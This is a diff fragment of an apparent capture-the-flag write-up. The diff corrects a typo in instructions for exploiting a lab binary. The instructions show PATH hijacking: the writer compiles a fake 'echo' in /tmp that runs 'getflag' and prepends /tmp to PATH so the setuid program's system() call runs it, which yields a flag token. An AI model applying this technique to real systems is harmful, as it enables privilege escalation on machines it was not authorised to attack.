@@ -19,7 +19,7 @@ system("/usr/bin/env echo Exploit me"Exploit me
 the function  "system()" which executes a shell commands (echo Exploit me)
 write a simple program called echo and make it execute 'getflag'. Due to permission use the /tmp folder to create it
 `gcc /tmp/echo.c -o echo`
-`export PATH=/tmp:$PATH` folder in front of the current PATH variable, ensuring it will be the first path used to search for the xecutables
+`export PATH=/tmp:$PATH` folder in front of the current PATH variable, ensuring it will be the first path used to search for the executables
 `./level03`
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
